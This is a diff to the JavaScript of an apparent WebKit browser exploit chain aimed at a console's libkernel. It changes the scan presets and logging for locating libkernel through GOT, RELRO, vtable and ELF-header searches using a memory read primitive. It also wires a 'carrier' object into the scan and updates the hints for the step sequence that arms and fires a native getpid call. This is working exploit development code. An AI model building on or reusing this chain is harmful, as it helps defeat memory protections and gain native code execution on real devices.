@@ -51,7 +51,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831b";
+const BUILD_ID = "rw-20250831c";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -421,7 +421,11 @@ const FIND_LK_LITE = {
     hdrCoarse: 32,
     hdrFine: 0,
     relroBatch: 8,
-    vtableEntries: 32,
+    vtableEntries: 48,
+    absSpan: 0x8000,
+    absBatch: 12,
+    nearRadius: 0x800000,
+    maxPages: 64,
 };
 const FIND_LK_NORM = {
     label: "norm",
@@ -429,7 +433,11 @@ const FIND_LK_NORM = {
     hdrCoarse: 64,
     hdrFine: 128,
     relroBatch: 16,
-    vtableEntries: 48,
+    vtableEntries: 64,
+    absSpan: 0x20000,
+    absBatch: 16,
+    nearRadius: 0x2000000,
+    maxPages: 256,
 };
 
 function parseCalPtr(raw) {
@@ -1976,10 +1984,13 @@ function finishFindLkChunk(chunk) {
         findLkAuto = false;
         findLkStop = false;
         mark("LK-GOT-MISS", (chunk.error || chunk.phase || "miss")
+            + (chunk.vtable ? " vt=" + chunk.vtable : "")
             + (chunk.extList && chunk.extList.length
-                ? " ext=" + chunk.extList.map(e => e.ptr).join(",") : "")
+                ? " ext=" + chunk.extList.map(function (e) { return e.ptr; }).join(",") : "")
+            + (chunk.pages != null ? " nearPages=" + chunk.pages : "")
+            + (chunk.tried != null ? " tried=" + chunk.tried : "")
             + " build=" + BUILD_ID);
-        mark("LK-HINT", "GOT/RELRO miss — try Scan GOT norm or paste lk from cal vtable");
+        mark("LK-HINT", "miss — Scan GOT norm or Scan libkernel (full) from gadget bar");
         state("Scan GOT miss — Verify lk or Scan libkernel", "bad");
         crashLog.flushSync();
         return true;
@@ -2020,6 +2031,7 @@ async function runFindLkAuto(preset) {
     const opts = Object.assign({
         nativeFn,
         retain: retained,
+        carrier: window._wkCarrier || null,
     }, findLkPreset);
     let loops = 0;
 
@@ -2028,39 +2040,55 @@ async function runFindLkAuto(preset) {
             const chunk = resolveLibkernelRelroChunk(p, webkitBase, off, findLkState, opts);
             findLkState = chunk.state;
             if (chunk.phase === "got-scan-start")
-                mark("LK-GOT", "phase hdr→dyn→RELRO→vtable");
+                mark("LK-GOT", "phase vt→abs→nearlk→below→hdr (poops-safe)");
+            else if (chunk.phase === "vt-ready")
+                mark("LK-GOT", "vtable " + chunk.vtable);
+            else if (chunk.phase === "vt-done")
+                mark("LK-GOT", "vtable ext=" + (chunk.ext || 0)
+                    + " — abs RELRO scan around vtable");
+            else if (chunk.phase === "abs-start")
+                mark("LK-GOT", "abs RELRO " + chunk.from + "…" + chunk.to);
+            else if (chunk.phase === "abs-done")
+                mark("LK-GOT", "abs miss tried=" + (chunk.tried || 0)
+                    + " — nearlk ±" + (findLkPreset.nearRadius || 0).toString(16));
+            else if (chunk.phase === "nearlk-start")
+                mark("LK-GOT", "nearlk hunt libkernel.sprx");
+            else if (chunk.phase === "nearlk-done")
+                mark("LK-GOT", "nearlk miss pages=" + (chunk.pages || 0)
+                    + " magic=" + (chunk.hits || 0) + " — below-webkit");
+            else if (chunk.phase === "below-done")
+                mark("LK-GOT", "below miss pages=" + (chunk.pages || 0) + " — ELF hdr");
             else if (chunk.phase === "hdr-ok")
                 mark("LK-GOT", "ELF hdr " + chunk.hdr + " — dynamic GOT");
             else if (chunk.phase === "hdr-skip")
-                mark("LK-GOT", "no ELF hdr — poops RELRO brute");
+                mark("LK-GOT", "no ELF hdr — skip webkit+RVA RELRO");
             else if (chunk.phase === "dyn-start")
                 mark("LK-GOT", "dyn GOT inCap=" + chunk.slots + "/" + chunk.total);
             else if (chunk.phase === "dyn-done")
-                mark("LK-GOT", "dyn miss " + (chunk.prev || "") + " — RELRO scan");
+                mark("LK-GOT", "dyn miss — ELF RELRO (hdr-relative)");
             else if (chunk.phase === "relro-start")
                 mark("LK-GOT", "RELRO " + chunk.span);
-            else if (chunk.phase === "relro-done")
-                mark("LK-GOT", "RELRO miss tried=" + (chunk.tried || 0) + " — textarea vtable");
-            else if (chunk.phase === "vt-ready")
-                mark("LK-GOT", "vtable " + chunk.vtable);
             else if (chunk.phase === "hdr" || chunk.phase === "dyn" || chunk.phase === "relro"
-                || chunk.phase === "vt")
+                || chunk.phase === "vt" || chunk.phase === "abs" || chunk.phase === "nearlk"
+                || chunk.phase === "below")
                 state("Scan GOT " + findLkPreset.label + " " + chunk.phase
-                    + (chunk.cursor != null ? " +0x" + chunk.cursor.toString(16) : "")
-                    + (chunk.tried != null ? " tried=" + chunk.tried : ""), "warn");
+                    + (chunk.cursor != null ? " @" + chunk.cursor.toString(16) : "")
+                    + (chunk.at != null ? " @" + chunk.at : "")
+                    + (chunk.tried != null ? " tried=" + chunk.tried : "")
+                    + (chunk.pages != null ? " pages=" + chunk.pages : ""), "warn");
             if (finishFindLkChunk(chunk)) {
                 renderOut();
                 return;
             }
             loops++;
-            if (loops % 3 === 0) {
-                mark("LK-FIND", findLkPreset.label + " " + (chunk.phase || "?")
+            if (loops % 8 === 0) {
+                mark("LK-GOT", findLkPreset.label + " " + (chunk.phase || "?")
                     + (chunk.pages != null ? " pages=" + chunk.pages : "")
                     + (chunk.tried != null ? " tried=" + chunk.tried : ""));
                 crashLog.flushSync();
                 renderOut();
             }
-            await new Promise(function (r) { setTimeout(r, 2); });
+            await new Promise(function (r) { setTimeout(r, 8); });
         }
         if (findLkStop)
             mark("LK-FIND", "stopped");
@@ -2893,6 +2921,7 @@ async function runStart() {
                     mark(t, d || "");
             },
         });
+        window._wkCarrier = carrier;
         const p = window.p;
         if (!p) throw new Error("window.p missing");
 
@@ -2906,7 +2935,7 @@ async function runStart() {
         } catch (prepErr) {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
-        mark("HINT", "Load cal ptr → Force lk (0 reads) → Arm → Fire getpid");
+        mark("HINT", "Scan GOT lite → Verify lk → Force lk → Arm → Fire getpid");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
